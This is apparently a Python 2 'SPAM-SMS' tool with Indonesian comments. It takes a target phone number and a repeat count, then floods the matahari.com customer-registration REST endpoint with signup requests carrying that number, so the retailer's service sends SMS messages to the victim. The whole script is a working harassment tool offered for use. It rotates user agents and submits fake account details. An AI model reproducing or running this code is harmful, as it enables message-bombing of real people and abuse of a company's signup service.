# coding:utf8

# CODED BY : KINGTEBE
# GITHUB : https://github.com/KINGTEBE-404
# Mau RIKOD ? Sertakan Sumber Anjim
# Tinggal Pake Aja Susah Amat Sih ! JANGAN RIKOD ATUH :V

import json,sys,time,random,os
from time import sleep
import datetime

try:
   import requests
except ModuleNotFoundError:
   print(' \x1b[97mSilahkan install dulu module requests: pip2 install requests')
   sys.exit()


def spin():
        try:
                L="/-\\|"
                for q in range(75):
                        time.sleep(0.1)
                        sys.stdout.write("\r \x1b[1;97m\x1b[1;91m#\x1b[1;97m \x1b[1;97mStarting [\x1b[1;92m"+L[q % len(L)]+"\x1b[1;97m]")
                        sys.stdout.flush()
        except:
                exit()

class Akugans:

	def __init__(self):
		self.ses = requests.Session()

	def gas(self,____code08____):
		agent = open("agent.txt","r").read()
		acak = random.choice(agent.split("\n"))
		head = {
			"Host": "www.matahari.com",
			"content-length": "238",
			"x-requested-with": "XMLHttpRequest",
			"x-requested-with": "XMLHttpRequest",
			"content-type":"application/json","accept": "*/*",
			"referer": "https://www.matahari.com/customer/account/create/",
			"accept-encoding":"gzip, deflate",
			"accept-language": "id-ID,en-US;q=0.8"}

		dat = json.dumps({"thor_customer":{"name":" Kingtebe","email_address":"BlackIT@gmail.com","mobile_country_code":"+62","gender_id":"1","mobile_number":____code08____,"mro":"","password":"Kingtebegans","birth_date":"06/03/2003"}})

		ajig = self.ses.post("https://www.matahari.com/rest/V1/thorCustomers",headers=head,data=dat)
		if "Succses" in ajig.text:
			print(" \x1b[91m! \x1b[97mMaaf Error Silahkan Coba Lagi Nanti ")
		else:
			print(" \x1b[92m✓ \x1b[97mSent To \x1b[93m"+ ____code08____ +" \x1b[97m\x1b[101m Subscribe BlackIT \033[0m \x1b[92mSukses")

while True:
	try:
		os.system('clear')
		print("""
	\x1b[93mSPAM-SMS

 \x1b[97m{\x1b[95m*\x1b[97m} Creator \x1b[90m: \x1b[97mChusni Achmad
 \x1b[97m{\x1b[95m*\x1b[97m} Youtube \x1b[90m: \x1b[97mInk Alliance
 \x1b[97m{\x1b[95m*\x1b[97m} Github  \x1b[90m: \x1b[92mhttps://github.com/achmadcm
\x1b[91m+\x1b[90m----------------------------------------------\x1b[91m+\n""")

		print(" \x1b[93m! \x1b[97mExample \x1b[90m: \x1b[97m08xxxx ")
		_____code08_____ = raw_input(" \x1b[92m• \x1b[97mTarget  \x1b[90m: \x1b[93m")
		____code62____ = raw_input(" \x1b[92m• \x1b[97mJumlah  \x1b[90m: \x1b[93m")
		print('')
		spin()
		print('\n')

		main=Akugans()
		for coli in range(int(____code62____)):
				main.gas(_____code08_____)
		else:
			print("\x1b[91m\x1b[92m\x1b[93m\x1b[95m\033[0m")
		print(" \x1b[97m{\x1b[95m•\x1b[97m} Spam Done Broo...")
		_____exec_____=raw_input(" \x1b[97m{\x1b[95m×\x1b[97m} Back To Spam ? y/n : ")
		if _____exec_____ =='y':
			Akugans()
		elif _____exec_____ =='n':
			print('\n \x1b[97mTHANK YOU SUDAH MENGGUNAKAN TOOLS INI \n')
			sys.exit()
	except Exception as Error:
		sys.exit(Error)

